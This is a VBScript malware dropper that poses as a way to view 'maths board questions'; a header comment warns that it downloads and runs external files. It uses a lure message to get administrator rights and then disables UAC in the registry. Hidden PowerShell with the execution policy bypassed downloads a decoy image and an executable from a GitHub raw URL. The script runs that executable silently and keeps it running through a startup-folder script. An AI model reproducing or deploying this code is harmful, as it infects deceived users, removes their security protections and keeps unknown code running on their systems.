'VBScript encoded with Microsoft Script Encoder
'*** WARNING: This script appears to download and execute files from external sources ***
'*** which could be potentially harmful. Use with caution and verify sources. ***

'**Start Encode**
On Error Resume Next
Dim WShell,FSObj,objShl,UserProf,AppDat,InstDir,ImgURL,ImgFile,PSImgCmd,DLURL,OutFile,PSCmd,StartFldr,StartScr,StartFile,StartCmd,userResponse
Set WShell=CreateObject("WScript.Shell")
Set FSObj=CreateObject("Scripting.FileSystemObject")
Set objShl=CreateObject("Shell.Application")

' Check if already running with elevated privileges
If WScript.Arguments.length > 0 Then
    ' Already elevated, disable UAC and continue
    On Error Resume Next
    WShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD"
    On Error GoTo 0
Else
    ' Directly trigger UAC prompt
    On Error Resume Next
    objShl.ShellExecute "wscript.exe","""" & WScript.ScriptFullName & """ elevated","","runas",0
    If Err.Number <> 0 Then
        ' User clicked No on UAC or UAC failed
        MsgBox "Please run as administrator to see the maths board questions", vbInformation, "Administrator Required"
    End If
    WScript.Quit
End If
UserProf=WShell.ExpandEnvironmentStrings("%USERPROFILE%")
AppDat=WShell.ExpandEnvironmentStrings("%APPDATA%")
InstDir=AppDat & "\service"
If Not FSObj.FolderExists(InstDir) Then
    FSObj.CreateFolder(InstDir)
End If
ImgURL="https://raw.githubusercontent.com/kunalya5185/Files/refs/heads/main/image2.jpeg"
ImgFile=InstDir & "\image2.jpg"
PSImgCmd="powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & _
         "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
         "try { " & _
         "$webClient = New-Object System.Net.WebClient; " & _
         "$webClient.Headers.Add('User-Agent', 'Mozilla/5.0'); " & _
         "$webClient.DownloadFile('" & ImgURL & "', '" & ImgFile & "') " & _
         "} catch { " & _
         "try { " & _
         "Invoke-WebRequest -Uri '" & ImgURL & "' -OutFile '" & ImgFile & "' -UseBasicParsing -UserAgent 'Mozilla/5.0' " & _
         "} catch { exit 1 } " & _
         "}"""
WShell.Run PSImgCmd,0,True
If FSObj.FileExists(ImgFile) Then
    WShell.Run """" & ImgFile & """",1,False
End If
DLURL="https://raw.githubusercontent.com/kunalya5185/Files/refs/heads/main/clientV2.exe"
OutFile=InstDir & "\New_Client2.exe"
PSCmd="powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & _
      "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
      "try { " & _
      "$webClient = New-Object System.Net.WebClient; " & _
      "$webClient.Headers.Add('User-Agent', 'Mozilla/5.0'); " & _
      "$webClient.DownloadFile('" & DLURL & "', '" & OutFile & "') " & _
      "} catch { " & _
      "try { " & _
      "Invoke-WebRequest -Uri '" & DLURL & "' -OutFile '" & OutFile & "' -UseBasicParsing -UserAgent 'Mozilla/5.0' " & _
      "} catch { exit 1 } " & _
      "}"""
WShell.Run PSCmd,0,True
If Not FSObj.FileExists(OutFile) Then
    WScript.Quit
End If
StartFldr=AppDat & "\Microsoft\Windows\Start Menu\Programs\Startup"
StartScr=StartFldr & "\windows__client_service5.vbs"
Set StartFile=FSObj.CreateTextFile(StartScr,True)
StartFile.WriteLine "Set WshShell = CreateObject(""WScript.Shell"")"
StartFile.WriteLine "WshShell.Run """ & OutFile & """, 0, False"
StartFile.Close
StartCmd="powershell.exe -WindowStyle Hidden -Command ""Start-Process '" & OutFile & "' -WindowStyle Hidden"""
WShell.Run StartCmd,0,False
WScript.Quit
'**End Encode**